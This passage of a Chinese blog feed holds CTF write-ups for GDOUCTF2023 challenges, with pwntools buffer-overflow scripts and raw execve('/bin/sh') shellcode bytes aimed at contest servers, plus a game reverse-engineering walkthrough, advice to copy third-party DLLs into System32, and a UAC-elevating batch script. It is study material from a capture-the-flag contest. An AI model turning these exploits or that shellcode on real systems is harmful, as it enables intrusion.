punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 从s1到v5需要填充0x1F - 0x04个字节，p64(1)将v5修改为1</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Password:\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><hr><h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><ul><li>直接将返回地址修改为 <code>print_flag()</code> 的地址<br>（<em>不过有一点不太明白，既然开启了 PIE 地址随机化，为什么还能直接得到 <code>print_flag()</code> 的真实地址</em>）</li></ul><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token number">0</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./easypwn"</span><span class="token punctuation">)</span>print_flag <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'print_flag'</span><span class="token punctuation">]</span>  <span class="token comment"># 通过elf获取ptint_flag()函数的地址</span><span class="token comment"># ptint_flag_addr = 0x0011D5  # 在IDA直接查看ptint_flag()函数的地址，两种方法都可以</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./easypwn"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node1.anna.nssctf.cn"</span><span class="token punctuation">,</span> <span class="token number">28291</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x1F</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>print_flag<span class="token punctuation">)</span>        <span class="token comment"># payload = b'a' * (0x1F + 0x08) + p64(ptint_flag_addr)  # 两种方法都可以</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Password:\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>NSSCTF{2e00ef92-c970-45a0-b36e-2287f14151d5}</p></blockquote><p><img src="https://s2.loli.net/2023/04/20/wgbfU4FkQWDhuyH.png" alt="2023GDOUCTF-EASY_PWN7.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDOUCTF2023-Shellcode</title>
      <link href="/2023/0479e318ce.html"/>
      <url>/2023/0479e318ce.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li>写入 <code>shellcode</code> 的时候，一定要注意可写入的空间的大小，有时生成的 <code>shellcode</code> 的长度会超出可写入空间</li></ul><hr><p><a href="https://www.nssctf.cn/contest/82/">（2023年4月16日）GDOUCTF2023-Shellcode</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>在 Ubuntu 下分析文件，并给予执行权限运行：<br><img src="https://s2.loli.net/2023/04/20/3PElLUwrNepDYSI.png" alt="2023GDOUCTF-ezshellcode1.png"><img src="https://s2.loli.net/2023/04/20/vpTmMq192XBPCFg.png" alt="2023GDOUCTF-ezshellcode2.png"></p></li><li><p>用 64 位 IDA 打开，定位到主函数：<br><img src="https://s2.loli.net/2023/04/20/AIVPJ4eyfOjZglQ.png" alt="2023GDOUCTF-ezshellcode3.png"><br>这里的 <code>name</code> 是写入到 <code>bss</code> 段上的，<code>buf</code> 写在栈上：<br><img src="https://s2.loli.net/2023/04/20/zMlsZ1WibqmFNK9.png" alt="2023GDOUCTF-ezshellcode4.png"><br>但是 <code>buf</code> 的栈只有 <code>0x0A</code> 的大小，可写入 <code>0x40</code> 的长度，所以存在栈溢出</p></li><li><p>于是思路就比较明确了：<br>① 通过 <code>name</code> 往 <code>bss</code> 段上写入 <code>shellcode</code><br>② 通过 <code>buf</code> 溢出，将跳转地址改为 <code>shellcode</code> 的地址，执行 <code>shellcode</code></p></li></ol><blockquote><p>虽然比赛时我的思路是对的，但是这个题有一点不一样<br><strong>因为 <code>name</code> 可以写入的大小只有 <code>0x25</code>，所以对 <code>shellcode</code> 的大小有一定的要求</strong><br><strong>使用 <code>pwntools</code> 生成的默认 <code>shellcode</code> 是不行的</strong></p></blockquote><ol start="4"><li>验证一下，例如使用 <code>pwntools</code> 生成默认 <code>shellcode</code>：<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 构造shellcode</span><span class="token keyword">print</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>  <span class="token comment"># b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 0x30</span></code></pre></li></ol><blockquote><p>可以看到 <code>pwntools</code> 生成的默认 <code>shellcode</code> 长度为 <code>0x30</code> 长于可写入的长度 <code>0x25</code></p></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 在网上找到的两个比较短一点的 shellcode</span><span class="token comment"># 这样的 shellcode 长度只有 0x1e</span>shellcode <span class="token operator">=</span> <span class="token string">b'\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'</span>shellcode <span class="token operator">=</span> <span class="token string">b'\x48\x31\xC0\x6A\x3B\x58\x48\x31\xFF\x48\xBF\x2F\x62\x69\x6E\x2F\x73\x68\x00\x57\x54\x5F\x48\x31\xF6\x48\x31\xD2\x0F\x05'</span></code></pre><ol start="5"><li>于是用短的 <code>shellcode</code> 编写脚本即可</li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token number">0</span>shellcode_addr <span class="token operator">=</span> <span class="token number">0x06010A0</span>  <span class="token comment"># 查看IDA得到bss段上name的写入地址</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ezshellcode"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node2.anna.nssctf.cn"</span><span class="token punctuation">,</span> <span class="token number">28073</span><span class="token punctuation">)</span>    shellcode <span class="token operator">=</span> <span class="token string">b'\x48\x31\xC0\x6A\x3B\x58\x48\x31\xFF\x48\xBF\x2F\x62\x69\x6E\x2F\x73\x68\x00\x57\x54\x5F\x48\x31\xF6\x48\x31\xD2\x0F\x05'</span>  <span class="token comment"># pwntools生成的默认shellcode超长，换一个短的</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please.\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x0A</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Let's start!\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>NSSCTF{612a3a24-b348-47fe-b86c-30d997ca26a5}</p></blockquote><p><img src="https://s2.loli.net/2023/04/20/Ohk4D9ByXcG67ML.png" alt="2023GDOUCTF-ezshellcode5.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDOUCTF2023-doublegame</title>
      <link href="/2023/04d5535da7.html"/>
      <url>/2023/04d5535da7.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>解决 exe 由于缺少 DLL 文件导致无法运行的问题</mark></p></li><li><p>迷宫题，<mark>不过这个题有点小坑，对迷宫进行了改动，所以看到迷宫不要傻乎乎的直接复制粘贴，多看看代码里有没有对迷宫做修改</mark></p></li><li><p><mark>代码与程序输出结合分析，快速定位关键位置</mark></p></li></ul><hr><p><a href="https://www.nssctf.cn/contest/82/">（2023年4月16日）GDOUCTF2023-doublegame</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>解压得到一个 <code>doublegame.exe</code> 程序，运行发现是一个贪吃蛇游戏<br>（<strong>部分人可能像我一样，打开 exe 会弹出一个缺少 DLL 的错误，导致无法运行，详见《运行程序遇到 “由于找不到 xxx.dll，无法继续执行代码”》</strong>）<br><img src="https://s2.loli.net/2023/04/19/SQs39bpotfPcjhm.png" alt="2023GDOUCTF-doublegame1.png"><br><img src="https://s2.loli.net/2023/04/19/fTYoIsGKHZk4OlV.png" alt="2023GDOUCTF-doublegame5.png"><br>经过试验，后面蛇的速度会越来越快</p></li><li><p>用 64 位 IDA 打开，F5 反编译：<br><img src="https://s2.loli.net/2023/04/19/rugmUSZ62K5wMBR.png" alt="2023GDOUCTF-doublegame2.png"><br>但是什么都没有</p></li><li><p>由于没有 <code>main()</code> 函数，shift + F12 查看一下字符串，定位到关键位置：<br><img src="https://s2.loli.net/2023/04/19/Zp6zajMlvdnByGT.png" alt="2023GDOUCTF-doublegame3.png"><br><img src="https://s2.loli.net/2023/04/19/zAMyGeXLvcqBmDY.png" alt="2023GDOUCTF-doublegame4.png"><br>可以看到很多与 flag 有关的信息<br>① 首先最关键的一点，告诉了 flag 的形式是 <code>HZCTF&#123;md5(path)+score&#125;</code><br>② 注意下图，有一个由很多 <code>&#39;0&#39;</code> 和 <code>&#39; &#39;</code> 组成的类似迷宫的东西，结合 <code>md5(path)</code> 可以大致推断 <code>path</code> 就是走迷宫的路径<br>③ 同时，还告诉了 <code>the first game tell the score</code>，结合文件名 <code>doublegame.exe</code> 可知，这个程序应该有两个游戏，第一个游戏是贪吃蛇，第二个游戏是走迷宫，贪吃蛇得到 <code>score</code>，走迷宫得到 <code>path</code></p></li><li><p>注意到字符串里的 <code>&quot;GAME OVER&quot;</code> 和 <code>&quot;?(y/n):&quot;</code> 与贪吃蛇游戏闯关失败时的输出有关，跟进函数位置：<br><img src="https://s2.loli.net/2023/04/19/VMKgeFtxdRIhNoD.png" alt="2023GDOUCTF-doublegame6.png"><br>根据 <code>sub_1400111F9(&quot;GAME OVER&quot;)</code> 可以推出 <code>sub_1400111F9()</code> 函数的功能是 <code>printf()</code><br>重命名一下，定位到关键 <code>if</code> 判断：<br><img src="https://s2.loli.net/2023/04/19/6z8ag2tImJcqhus.png" alt="2023GDOUCTF-doublegame7.png"><br>跟进上面两个红框中 <code>printf()</code> 的输出内容：<br><img src="https://s2.loli.net/2023/04/19/yxRacOL6zrChgfN.png" alt="2023GDOUCTF-doublegame8.png"><br>内容是十六进制数据，结合游戏的输出，这应该是输出的某些中文内容，最后 <code>%d</code> 是一个游戏中的数据<br>重点在后面的一个 <code>if</code> 判断：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> dword_140022CD0 <span class="token operator">></span> <span class="token number">13371337</span> <span class="token punctuation">)</span>  <span class="token function">sub_14001136B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sub_1400110E6</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>首先，最后的 <code>sub_1400110E6()</code> 函数会执行 <code>sub_140012A40()</code> 用于在本地生成一个 <code>贪吃蛇最高得分记录.txt</code> 的文本文件：<br><img src="https://s2.loli.net/2023/04/19/zprqeYn36wHSitN.png" alt="2023GDOUCTF-doublegame9.png"><br>关键在于当 <code>dword_140022CD0 &gt; 13371337</code> 时，会执行 <code>sub_14001136B()</code> 函数<br><code>sub_14001136B()</code> 函数会执行 <code>sub_140012CF0()</code>：<br><img src="https://s2.loli.net/2023/04/19/Njz3bnwJAMF6vW4.png" alt="2023GDOUCTF-doublegame10.png"><br>这个函数用来生成迷宫的，以及 <code>switch()</code> 中的 <code>&#39;w&#39;</code>、<code>&#39;a&#39;</code>、<code>&#39;s&#39;</code>、<code>&#39;d&#39;</code> 用来控制方向<br>由于这是第二个游戏，明显 <code>dword_140022CD0 &gt; 13371337</code> 就是通关条件<br>（<strong>可能是游戏分数 <code>score &gt; 13371337</code> 就进入下一关，但是这里只是猜测，后面会验证，所以仅凭徒手玩游戏通关是几乎不可能的了</strong>）</p></li><li><p>将 <code>sub_140012CF0()</code> 函数提供的迷宫数据提取出来<br><mark>但是这里有个小坑，很重要，没有发现的话是做不出来的</mark>：<br><img src="https://s2.loli.net/2023/04/20/JRyd2xZrTGKvBgt.png" alt="2023GDOUCTF-doublegame12.png"><br>在上方的一堆 <code>&#39;0&#39;</code> 和 <code>&#39; &#39;</code> 都是迷宫的内容，<mark>注意最后有一个 <code>v11[4] = 48</code>，48 是 <code>&#39;0&#39;</code> 的 ASCii 码</mark><br>找到 <code>v11</code> 的位置，也就是<mark>将 <code>@11111110101111111110</code>（为了看得更清楚，我把空格用 <code>&#39;1&#39;</code> 来表示） 这一行的第 5 个位置的空格改为 <code>&#39;0&#39;</code> 了</mark></p></li><li><p>提取出修改后的迷宫：<br>（<strong>这里有个小技巧：由于 <code>&#39;0&#39;</code> 表示墙壁，<code>&#39; &#39;</code> 表示路，可以在 Pycharm 中全选 <code>&#39; &#39;</code>，空格会有高亮，路径会更显眼</strong>）<br><img src="https://s2.loli.net/2023/04/19/lnfKSoLiR4tgMWJ.png" alt="2023GDOUCTF-doublegame11.png"><br>得到路径 <code>path</code>：<code>dddssssddwwwwddssddwwwwwwddddssaassddddwwwwddwwwwddd</code><br>MD5 加密后为：<code>811173b05afff098b4e0757962127eac</code></p></li><li><p>这里来分析一下，为什么是个走迷宫，具体信息是怎么样的<br>① 首先这里有个 <code>while</code> 循环，判断的是当前位置是否走到了出口，结合<code>（v15，v16）</code>是<code>（15，0）</code>对应 <code>&#39;@&#39;</code> 的位置，而<code>（v17，v18）</code>是<code>（7，20）</code>对应最后出口的那个点<br><img src="https://s2.loli.net/2023/04/19/dLpQo8istWO2UJy.png" alt="2023GDOUCTF-doublegame13.png"><br>② 再往下，注意到有一步操作会影响到后面的 <code>if</code> 条件，往左走的时候，如果当前位置是 <code>&#39;*&#39;</code> 的话，就将 <code>v7[20] = 48</code>，否则后面的 <code>if</code> 不会执行，而是输出 <code>&quot;error&quot;</code>，所以路径必须要经过 <code>&#39;*&#39;</code> 的位置<br><img src="https://s2.loli.net/2023/04/19/eycwlsiZQmEqSTn.png" alt="2023GDOUCTF-doublegame14.png"><br><img src="https://s2.loli.net/2023/04/19/m384wFGBCz9HpuJ.png" alt="2023GDOUCTF-doublegame15.png"><br>③ 最后，注意这个 <code>if</code> 条件<br><img src="https://s2.loli.net/2023/04/19/8HYVd2Fi4cAXDWa.png" alt="2023GDOUCTF-doublegame16.png"><br>函数 <code>sub_140011433(0)</code> 会执行 <code>sub_140011E10(unsigned int a1)</code>：<br><img src="https://s2.loli.net/2023/04/19/Ed915ZXtkaITlyR.png" alt="2023GDOUCTF-doublegame17.png"><br>根据形式，<code>sub_14001126C(&quot;%d&quot;, &amp;v2)</code> 应该是一个 <code>scanf()</code> 函数，让用户输入的 <code>v2</code> 就是 <code>key</code>，而前面又提示说 <code>the score is saving cat&#39;s key!\n</code> ，可以知道这个 <code>v2</code> 就是 <code>score</code></p></li><li><p>由于传参 <code>a1 = 0</code>，<code>v2</code> 初值为 0，最后返回 <code>v2</code> 的值，而 <code>sub_140011433(0)</code> 的返回值为 <code>v24</code>，且 <code>v24</code> 要等于 <code>13376013</code>，所以 <code>v2 = 0x1DC4 ^ 13376013</code><br><img src="https://s2.loli.net/2023/04/19/YPCcjquk4FaLpQV.png" alt="2023GDOUCTF-doublegame18.png"><br>最后得到 <code>v2 = 13371337</code>，<strong>验证了前面 <code>score &gt; 13371337</code> 就进入下一关的猜想</strong><br>于是得到 <code>score</code>：<code>13371337</code></p></li></ol><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>NSSCTF{811173b05afff098b4e0757962127eac13371337}<br>（最终要求将 HZCTF 改为 NSSCTF）</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>运行程序显示 “由于找不到 xxx.dll，无法继续执行代码”</title>
      <link href="/2023/0487826845.html"/>
      <url>/2023/0487826845.html</url>
      
        <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><blockquote><p>在运行 <code>.exe</code> 程序时弹出 <code>&quot;由于找不到 xxx.dll，无法继续执行代码&quot;</code> 的错误，导致程序无法执行</p></blockquote><p><img src="https://s2.loli.net/2023/04/17/YcbuAzVI9PLhCpy.png" alt="由于找不到xxx.dll无法继续执行代码1.png"></p><hr><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><blockquote><p>缺少必要的运行库文件，安装该 <code>.dll</code> 运行库文件即可</p></blockquote><hr><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><ol><li><p>在网上自行下载缺少的 <code>.dll</code> 文件，直接搜 <code>&quot;xxx.dll&quot;</code> 即可<br>（因为每个人缺少的运行库各不相同，无法提供统一的 DLL 文件，但是这些文件在网上都是可以下载到的，我这里提供一个下载 <code>.dll</code> 文件的网站：<a href="https://cn.dll-files.com/">免费下载缺失的 DLL 文件 | DLL‑files.com</a>）</p></li><li><p>我这里就以图片中所缺少的 <code>ucrtbased.dll</code> 为例。<em>通常来说，这样的 <code>.dll</code> 库文件我们需要下载两个，一个是 32 位的，一个是 64 位的</em></p></li><li><p>进入网站：<a href="https://cn.dll-files.com/">免费下载缺失的 DLL 文件 | DLL‑files.com</a><br>在搜索框中搜索 <code>ucrtbased.dll</code><br><img src="https://s2.loli.net/2023/04/17/ojO4g1YzKMpGFID.png" alt="由于找不到xxx.dll无法继续执行代码2.png"><br>往下翻，找到这个位置：<br><img src="https://s2.loli.net/2023/04/17/U5Hc7sbt8BOS6Qe.png" alt="由于找不到xxx.dll无法继续执行代码3.png"><br>有的 <code>.dll</code> 文件会有特别多的版本，不需要管，只需要看好架构（<code>Architecture</code>）即可<br><code>Architecture 64</code> 代表 64 位，<code>Architecture 32</code> 代表 32 位<br>将 <code>ucrtbased.dll</code> 的 64 位和 32 位文件各下载一个，版本（<code>Version</code>）随意，当然越新的版本自然越好</p></li><li><p>注意：<br><strong>一定要留意下载到本地的时候哪一个压缩包是 32 位的，哪一个压缩包是 64 位的，不要搞混了</strong><br>解压后，我这里以文件夹的命名来区分 32 位和 64 位，<strong>实际你下载的时候两个文件命名是相同的</strong><br><img src="https://s2.loli.net/2023/04/17/ftI2X3GpEYr5KhD.png" alt="由于找不到xxx.dll无法继续执行代码4.png"></p></li><li><p>首先了解一点基础知识：<br>在 64 位 的 Windows 系统中<br>放置 32 位 DLL 文件的默认路径为：<code>C:\Windows\SysWOW64\</code><br>放置 64 位 DLL 文件的默认路径为：<code>C:\Windows\System32\</code></p></li><li><p>于是，将 <code>ucrtbased_32 文件夹</code> 内的 <code>ucrtbased.dll</code> 复制到 <code>C:\Windows\SysWOW64\</code> 路径下<br>将 <code>ucrtbased_64 文件夹</code> 内的 <code>ucrtbased.dll</code> 复制到 <code>C:\Windows\System32\</code> 路径下</p></li><li><p>再次运行报错的 <code>.exe</code> 文件，观察问题是否解决<br>如果只是缺少 <code>ucrtbased.dll</code> 这一个 DLL 库文件，那么到此为止，程序基本就已经可以正常运行了<br>例如我再次打开刚刚报错的 exe 程序如下图：<br><img src="https://s2.loli.net/2023/04/17/5R3TBqsmQKvjbXk.png" alt="由于找不到xxx.dll无法继续执行代码5.png"></p></li><li><p><em>如果依然提示缺少其他的 DLL 文件，继续按此教程依次下载其他缺失的 DLL 文件即可</em></p></li></ol><blockquote><p>如果上述操作都试过了，但 exe 程序仍然无法运行<br>可能是因为 DLL 文件虽然复制到了目录下，但是并未注册，可以自行搜索注册 DLL 文件的教程，例如：<a href="https://jingyan.baidu.com/article/e75aca850f574c142edac6ee.html">如何注册dll文件-百度经验</a><br>（因为我没有遇到过，我按照上述操作就已经成功解决问题，所以无法提供教程，但是不排除有的人会遇到这种问题）</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VM虚拟机显示 “未能开启xxx.vmx”</title>
      <link href="/2023/04136f9f8e.html"/>
      <url>/2023/04136f9f8e.html</url>
      
        <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><blockquote><p>最近有时候打开 VM 虚拟机时，会弹出：<code>未能开启“xxx(虚拟机路径)\xxx(虚拟机名).vmx”</code> 的警告，导致虚拟机无法正常开机</p></blockquote><p><img src="https://s2.loli.net/2023/04/11/kADdNj5BGg6MRUJ.png" alt="VM虚拟机未能开启解决办法1.png"></p><hr><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><blockquote><p>产生原因是 VMware 的服务出现问题，需要重新启动服务，VM 即可恢复正常</p></blockquote><hr><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><h3 id="手动修改"><a href="#手动修改" class="headerlink" title="手动修改"></a>手动修改</h3><ol><li><p>打开服务，可先通过 <code>ctrl + alt + delete</code> 打开任务管理器，在左侧栏选中服务<br><img src="https://s2.loli.net/2023/04/11/CujAOlwSoQGndIM.png" alt="VM虚拟机未能开启解决办法2.png"></p></li><li><p>往下翻，找到名称为 <code>VMAuthdService</code> 的服务</p></li><li><p>右键，重新启动<br><img src="https://s2.loli.net/2023/04/11/RWkXZafwSqsObcD.png" alt="VM虚拟机未能开启解决办法3.png"></p></li><li><p>再次打开 VM 中的虚拟机，发现问题解决，不会报错了</p></li></ol><hr><h3 id="脚本修改"><a href="#脚本修改" class="headerlink" title="脚本修改"></a>脚本修改</h3><blockquote><p>每次都手动去重新启动服务未免太麻烦，这里利用脚本自动重启</p></blockquote><ol><li><p>首先新建一个 txt 文本文件，例如：VM.txt</p></li><li><p>写入如下内容：</p><pre class="language-c" data-language="c"><code class="language-c">@echo on net stop <span class="token string">"VMAuthdService"</span>     net start <span class="token string">"VMAuthdService"</span>pause</code></pre></li><li><p>其中 <code>@echo on</code> 表示 cmd 命令回显，后面两条命令用来停止和开启 <code>VMAuthdService 服务</code>，<code>pause</code> 表示命令执行完后不关闭 cmd 窗口</p></li><li><p><del>将 <code>VM.txt</code> 重命名为 <code>VM.bat</code> 双击执行</del>，但是这样的话，运行会出错，因为需要有管理员权限</p></li><li><p>在 VM.txt 最前面加上一段代码：（<em>这段代码用来调用管理员权限</em>）</p><pre class="language-c" data-language="c"><code class="language-c">@echo off<span class="token operator">%</span><span class="token number">1</span> mshta vbscript<span class="token operator">:</span><span class="token function">CreateObject</span><span class="token punctuation">(</span><span class="token string">"Shell.Application"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ShellExecute</span><span class="token punctuation">(</span><span class="token string">"cmd.exe"</span><span class="token punctuation">,</span><span class="token string">"/c %~s0 ::"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">"runas"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>close<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span>exitcd <span class="token operator">/</span>d <span class="token string">"%~dp0"</span></code></pre></li><li><p>所以，最终代码应该是这样的：</p><pre class="language-c" data-language="c"><code class="language-c">@echo off<span class="token operator">%</span><span class="token number">1</span> mshta vbscript<span class="token operator">:</span><span class="token function">CreateObject</span><span class="token punctuation">(</span><span class="token string">"Shell.Application"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ShellExecute</span><span class="token punctuation">(</span><span class="token string">"cmd.exe"</span><span class="token punctuation">,</span><span class="token string">"/c %~s0 ::"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">"runas"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>close<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span>exitcd <span class="token operator">/</span>d <span class="token string">"%~dp0"</span>@echo on net stop <span class="token string">"VMAuthdService"</span>     net start <span class="token string">"VMAuthdService"</span>pause</code></pre></li><li><p>将 <code>VM.txt</code> 重命名为 <code>VM.bat</code>，双击即可运行：（<em>会自动跳出询问管理员权限的窗口，点击 “是” 即可</em>）<br><img src="https://s2.loli.net/2023/04/17/vKYIJ9cNqatuGCX.png" alt="VM虚拟机未能开启解决办法4.png"></p></li><li><p>以后 VM 再出现这个报错，直接双击 <code>VM.bat</code> 即可</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023湖北省第七届楚慧杯-Level_up</title>
      <link href="/2023/03cc49f762.html"/>
      <url>/2023/03cc49f762.html</url>
      
